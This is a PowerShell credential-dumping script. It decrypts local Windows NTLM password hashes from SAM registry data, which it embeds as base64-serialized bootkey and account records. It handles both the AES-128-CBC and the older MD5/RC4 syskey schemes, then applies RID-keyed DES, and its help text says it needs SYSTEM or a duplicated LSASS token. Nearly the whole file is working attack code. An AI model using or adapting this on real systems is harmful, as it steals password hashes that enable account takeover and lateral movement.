function Get-NTLMLocalPasswordHashes2 {
    $bootkey = [Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAE8AYgBqAGUAYwB0AFsAXQA8AC8AVAA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEEAcgByAGEAeQA8AC8AVAA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAE8AYgBqAGUAYwB0ADwALwBUAD4ADQAKACAAIAAgACAAPAAvAFQATgA+AA0ACgAgACAAIAAgADwATABTAFQAPgANAAoAIAAgACAAIAAgACAAPABCAHkAPgAxADEAMAA8AC8AQgB5AD4ADQAKACAAIAAgACAAIAAgADwAQgB5AD4AMQAzADMAPAAvAEIAeQA+AA0ACgAgACAAIAAgACAAIAA8AEIAeQA+ADUANgA8AC8AQgB5AD4ADQAKACAAIAAgACAAIAAgADwAQgB5AD4AMgAxADMAPAAvAEIAeQA+AA0ACgAgACAAIAAgACAAIAA8AEIAeQA+ADIANAA8AC8AQgB5AD4ADQAKACAAIAAgACAAIAAgADwAQgB5AD4AMgAyADkAPAAvAEIAeQA+AA0ACgAgACAAIAAgACAAIAA8AEIAeQA+ADEAMAAyADwALwBCAHkAPgANAAoAIAAgACAAIAAgACAAPABCAHkAPgAyADUANQA8AC8AQgB5AD4ADQAKACAAIAAgACAAIAAgADwAQgB5AD4AMQA4ADUAPAAvAEIAeQA+AA0ACgAgACAAIAAgACAAIAA8AEIAeQA+ADEAMwA2ADwALwBCAHkAPgANAAoAIAAgACAAIAAgACAAPABCAHkAPgA3ADEAPAAvAEIAeQA+AA0ACgAgACAAIAAgACAAIAA8AEIAeQA+ADgAOAA8AC8AQgB5AD4ADQAKACAAIAAgACAAIAAgADwAQgB5AD4AOAA5ADwALwBCAHkAPgANAAoAIAAgACAAIAAgACAAPABCAHkAPgAxADYANwA8AC8AQgB5AD4ADQAKACAAIAAgACAAIAAgADwAQgB5AD4AMQA3ADMAPAAvAEIAeQA+AA0ACgAgACAAIAAgACAAIAA8AEIAeQA+ADIAMgA1ADwALwBCAHkAPgANAAoAIAAgACAAIAA8AC8ATABTAFQAPgANAAoAIAAgADwALwBPAGIAagA+AA0ACgA8AC8ATwBiAGoAcwA+AA==')));

    $vS = @("PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABCAEEAPgBBAEEAQQBBAEEAQQB3AEIAQQBBAEEARABBAEEARQBBAEQAQQBFAEEAQQBBAGcAQQBBAEEAQQBBAEEAQQBBAEEARgBBAEUAQQBBAEEAZwBBAEEAQQBBAEEAQQBBAEEAQQBIAEEARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEgAQQBFAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEASABBAEUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBIAEEARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEgAQQBFAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEASABBAEUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBIAEEARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEgAQQBFAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEASABBAEUAQQBBAEIAVQBBAEEAQQBDAG8AQQBBAEEAQQBOAEEARQBBAEEAQQBnAEEAQQBBAEEAQgBBAEEAQQBBAFAAQQBFAEEAQQBCAGcAQQBBAEEAQQBBAEEAQQBBAEEAVgBBAEUAQQBBAEQAZwBBAEEAQQBBAEEAQQBBAEEAQQBqAEEARQBBAEEARABnAEEAQQBBAEEAQQBBAEEAQQBBAHgAQQBFAEEAQQBEAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBRAEEAVQBnAE8AdwBBAEEAQQBEADgAQQBBAEEAQQBGAEEAQQBBAEEARQBRAEEAQQBBAEEAQwBBAEQAQQBBAEEAZwBBAEEAQQBBAEwAQQBGAEEAQgBFAEEAQQBVAEIAQQBRAEUAQQBBAEEAQQBBAEEAQQBFAEEAQQBBAEEAQQBBAHMAQQBVAEEAUAAvAC8ASAB3AEEAQgBBAFEAQQBBAEEAQQBBAEEAQgBRAGMAQQBBAEEAQQBDAEEASwBnAEEAQgBRAEEAQQBBAEEAQQBBAEYAQQBCAGIAQQB3AEkAQQBBAFEARQBBAEEAQQBBAEEAQQBBAEUAQQBBAEEAQQBBAEEAQQBBAFkAQQBQADgASABEAHcAQQBCAEEAZwBBAEEAQQBBAEEAQQBCAFMAQQBBAEEAQQBBAGcAQQBnAEEAQQBBAEEAQQBZAEEAUAA4AEgARAB3AEEAQgBBAGcAQQBBAEEAQQBBAEEAQgBTAEEAQQBBAEEAQQBrAEEAZwBBAEEAQQBBAEEANABBAEIAcwBEAEEAZwBBAEIAQwBnAEEAQQBBAEEAQQBBAEQAdwBNAEEAQQBBAEEAQQBCAEEAQQBBADMAcQBJAG8AWgB5AEUAKwAwAHEAOABaAHIAVgAxADUAcwBNAEUASABLAFMAZABXAC8AQwBEAFkAcgBXAGIAMgBFAFAASgBvACsAdAA4AHEAKwBBADgAQQBBAEMAUQBBAFIAQQBBAEMAQQBBAEUARgBBAEEAQQBBAEEAQQBBAEYARgBRAEEAQQBBAE0AaQBNAFAASQBHAFcAWQA2AHUAUQB5AGkARwBaAHUAKwA0AEQAQQBBAEEAQgBBAGcAQQBBAEEAQQBBAEEAQgBTAEEAQQBBAEEAQQBnAEEAZwBBAEEAQQBRAEkAQQBBAEEAQQBBAEEAQQBVAGcAQQBBAEEAQQBJAEEASQBBAEEARgBRAEEAWgBRAEIAegBBAEgAUQBBAFYAQQBCAGwAQQBIAE0AQQBkAEEARAAvAC8ALwAvAC8ALwAvAC8ALwAvAC8ALwAvAC8ALwAvAC8ALwAvAC8ALwAvAC8ALwAvAC8ALwAvAFgAZQA4ADgAQgBBAGcAQQBBAEIAdwBBAEEAQQBBAE0AQQBBAGcAQQBBAEEAQQBBAEEARQBOAGsASwBoAGoAVABYAGUAOAAvAGMAVgBUAGYARABJAEQARgBaAEMAdwBNAEEAQQBnAEEAUQBBAEEAQQBBAHUAaQBoAGgARgAxAFQAOQBqAFAATwA3AGkAZAA3AFUANQBQAGIAVQB4ACsAYgBqAFkAUABxAG0AWgBjAEgAdgBlADcAVwBpAG4AaAB0AEYAUABUAEgAdABTAEEARgA5AFYANgArAFQAZABBAEkANwB0AFQANgB4AHQARgB3AGcAQQB3AEEAQwBBAEIAQQBBAEEAQQBDAHMAcQBtAG0AYgBVAFcAdgB0AEgAMABPAEwAcAB4AHcATQBWAHQAUgBVADAAMwBmADIAdQBKADUAVQBJAFgATgAzAFIAYQB4AEsARQAwAHEAegBzAG8AawBuAGYARwBkADAAZgBLAFcALwA4AEQAUAB4AGkAeABzAFcAMwBCAFkARABBAEEASQBBAEUAQQBBAEEAQQBLAHoAbgBqADAAbABKAGgATQBHAEoAMgBZAGwASwBDADUAaQBmAFoAcABYAFEAUwBEAFgANwB0AG0ASQB0AEEAQgBDAG4AcgBLAHYANQA0AFAATgBBAHoAYQBVAG8ANgBFAHUAZABYAEUAcABhAGUAeQBYAC8AUgBVAGQAawBnAHcAPQA9ADwALwBCAEEAPgANAAoAPAAvAE8AYgBqAHMAPgA=");
    $fS = @("PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABCAEEAPgBBAHcAQQBCAEEAQQBBAEEAQQBBAEIASwBjAHAAcwBkAC8ATAAzAFcAQQBRADgAQQBBAEEAQQBBAEEAQQBBAEEAQQBJAEQAUwBGAGsAZQA1AC8ALwA4AEEAUQBKAGIAVgBOAHYALwAvAC8AdwBBAEEAQQBBAEEAQQBBAEEAQwBBAEEATQB3AGQAegAvAHYALwAvAC8AOABBAHoAQgAzAFAAKwAvAC8ALwAvAHcAQQBBAEEAQQBBAEEAQQBBAEEAQQA3AHcATQBBAEEAQQBFAEEAQQBBAEEASQBBAEIAZwBBAEEAQQBBAEEAQQBBAEUAQQBBAEEAQQBEAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUQBBAEMAQQBBAEEAQQBjAEEAQQBBAEEARABBAEEAQQBBAEEAZwBBAEEAQQBBAHcAKwBwAHgARABCAEwALwBuAGYARABQAFUANwBsAE4AegBaAGIAVABSAHcATwBwAFcAVgBOAG4AVwA4AG4AZABxAHEASwBwAGQARwArAHAAQQBIAFIASwBVAFcASABPAEQAWgAwAFUAVQBwAGcAMABaADEAQQBlAGMAQgBCAGkAWQBHAEIARAA5AGoAYQB5AEgAQgBZACsAdgA0AGIASgBBAG8AZQByAEkAdwBrAGIAegBMAHIAZABiAEEAUwA2AHQAUAA0AFMAMwBZAGsAcQBLAFkAVgBtAHMARwBLAGgAVQBBAE4AdQBqAFMAUQBnAE4AQgBoAFgAbgBHAGgAbgBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEkAQQBBAEEAQgB3AEEAQQBBAEEATQBBAEEAQQBBAEMAQQBBAEEAQQBCAE0ARgBDAFQAWgBYAEoANgBkAFoAcwB6ADQATwBVAG4AagBrAGgAQQBkAEsAWABIAEYARgBSAG0AeABJAFIAVwB6AG4ALwBFAFoAYgB0AHAAQwB6AFcAbgB0AEYANwA4AFUASQBCAGMAUABaAE4ASAA0AFoARAA0AG4ANAAvAEkAdABZAEUAUgAwACsARwBDAGYAZABmAFUAWgB6AE8AVABqAGYAeQB4AEcAWgBDAGUASQBNAC8AKwBOAEYASwBSADUAaQBwADAAQQBrAGIAZQBjADcAagBjAGMAWQBSAFQASABQAFAANABSAGgANQBCAFUATgBvAGoAWgBxAEkAMABBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAHcAQQBBAEEAQQBBAEEAQQBBAEEAPQA8AC8AQgBBAD4ADQAKADwALwBPAGIAagBzAD4A");
    
    $rids = @("000003EE");

    for ($i=0; $i -lt $rids.length; $i++) {
        $rid = $rids[$i];
        $v = ([Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($vS[$i]))));
        $f = ([Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($fS[$i]))));

        $md5 = [Security.Cryptography.MD5]::Create()

        $aes = [Security.Cryptography.Aes]::Create()
        $aes.Mode = [Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [Security.Cryptography.PaddingMode]::None
        $aes.KeySize = 128

        $des = [Security.Cryptography.DES]::Create()
        $des.Mode = [Security.Cryptography.CipherMode]::ECB
        $des.Padding = [Security.Cryptography.PaddingMode]::None

        $offset = [BitConverter]::ToInt32($v, 0x0C) + 0xCC;

        $len = [BitConverter]::ToInt32($v, 0x10);
        $username = [Text.Encoding]::Unicode.GetString($v, $offset, $len);

        $offset = [Bitconverter]::ToInt32($v, 0xA8) + 0xCC

        switch ($v[0xAC]) {
            0x38 {
                $enc_syskey = $f[0x88..0x97]
                $enc_syskey_iv = $f[0x78..0x87]
                $enc_syskey_key = $bootkey

                $syskey = $aes.CreateDecryptor($enc_syskey_key, $enc_syskey_iv).TransformFinalBlock($enc_syskey, 0, 16)

                $enc_ntlm = $v[($offset+24)..($offset+24+0x0F)]
                $enc_ntlm_iv = $v[($offset+8)..($offset+23)]
                $enc_ntlm_key = $syskey

                $enc_ntlm = $aes.CreateDecryptor($enc_ntlm_key, $enc_ntlm_iv).TransformFinalBlock($enc_ntlm, 0, 16)
            }
            
            0x14 {
                $enc_syskey = $f[0x80..0x8f]
                $enc_syskey_key = $md5.ComputeHash(
                    $f[0x70..0x7f] +
                    [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0") +
                    $bootkey +
                    [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0"))
                
                $syskey = rc4 $enc_syskey $enc_syskey_key

                $enc_ntlm = $v[($offset+4)..($offset+4+0x0F)]
                $enc_ntlm_key = $md5.ComputeHash(
                    $syskey +
                    (3,2,1,0 | % {[Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16)}) +
                    [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0"))

                $enc_ntlm = rc4 $enc_ntlm $enc_ntlm_key
            }

            default {
                return New-Object PSObject -Property @{
                    Username = $username
                    RID = [int]"0x$rid"
                    NT = "31D6CFE0D16AE931B73C59D7E0C089C0"
                }
            }
        }

        $des_str_1 = 3,2,1,0,3,2,1 | % {[Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16)}
        $des_str_2 = 0,3,2,1,0,3,2 | % {[Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16)}
        $des_key_1 = str_to_key($des_str_1)
        $des_key_2 = str_to_key($des_str_2)

        $ntlm_1 = $des.CreateDecryptor($des_key_1, $des_key_1).TransformFinalBlock($enc_ntlm, 0, 8)
        $ntlm_2 = $des.CreateDecryptor($des_key_2, $des_key_2).TransformFinalBlock($enc_ntlm, 8, 8)

        $ntlm = [BitConverter]::ToString($ntlm_1+$ntlm_2) -split '-' -join ''

        New-Object PSObject -Property @{
            Username = $username
            RID = [int]"0x$rid"
            NT = $ntlm
        }
    }

    <#
        .SYNOPSIS
        Extract local NTLM password hashes.

        .DESCRIPTION
        Extract all local NTLM user password hashes from the registry handling latest
        AES-128-CBC with IV obfuscation techniques introduced with Windows 10 1607 as
        well as the traditional MD5/RC4 approach used in Windows 7/8/8.1.

        .OUTPUTS
        System.Management.Automation.PSObject

        .COMPONENT
        Win32

        .NOTES
        Requires to be run as SYSTEM or with LSASS Process Token duplicated.

        .EXAMPLE
        Get-NTLMLocalPasswordHashes
    #>
}

function rc4($data, $key) {
    $r = $data
    $s = New-Object Byte[] 256
    $k = New-Object Byte[] 256
    for ($i = 0; $i -lt 256; $i++) {
        $s[$i] = [Byte]$i
        $k[$i] = $key[$i % $key.Length]
    }
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $s[$i] + $k[$i]) % 256
        $temp = $s[$i]
        $s[$i] = $s[$j]
        $s[$j] = $temp
    }
    $i = $j = 0
    for ($x = 0; $x -lt $r.Length; $x++) {
        $i = ($i + 1) % 256
        $j = ($j + $s[$i]) % 256
        $temp = $s[$i]
        $s[$i] = $s[$j]
        $s[$j] = $temp
        [int]$t = ($s[$i] + $s[$j]) % 256
        $r[$x] = $r[$x] -bxor $s[$t]
    }
    return $r
}

function str_to_key($s) {
    $odd_parity = @(
    1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254)
    $key = @()
    $key += bitshift $s[0] -1
    $key += (bitshift ($s[0] -band 0x01) 6) -bor (bitshift $s[1] -2)
    $key += (bitshift ($s[1] -band 0x03) 5) -bor (bitshift $s[2] -3)
    $key += (bitshift ($s[2] -band 0x07) 4) -bor (bitshift $s[3] -4)
    $key += (bitshift ($s[3] -band 0x0F) 3) -bor (bitshift $s[4] -5)
    $key += (bitshift ($s[4] -band 0x1F) 2) -bor (bitshift $s[5] -6)
    $key += (bitshift ($s[5] -band 0x3F) 1) -bor (bitshift $s[6] -7)
    $key += $s[6] -band 0x7F
    $key[0] = $odd_parity[(bitshift $key[0] 1)]
    $key[1] = $odd_parity[(bitshift $key[1] 1)]
    $key[2] = $odd_parity[(bitshift $key[2] 1)]
    $key[3] = $odd_parity[(bitshift $key[3] 1)]
    $key[4] = $odd_parity[(bitshift $key[4] 1)]
    $key[5] = $odd_parity[(bitshift $key[5] 1)]
    $key[6] = $odd_parity[(bitshift $key[6] 1)]
    $key[7] = $odd_parity[(bitshift $key[7] 1)]
    $key
}

function bitshift($x, $c) {
    return [math]::Floor($x * [math]::Pow(2, $c))
}
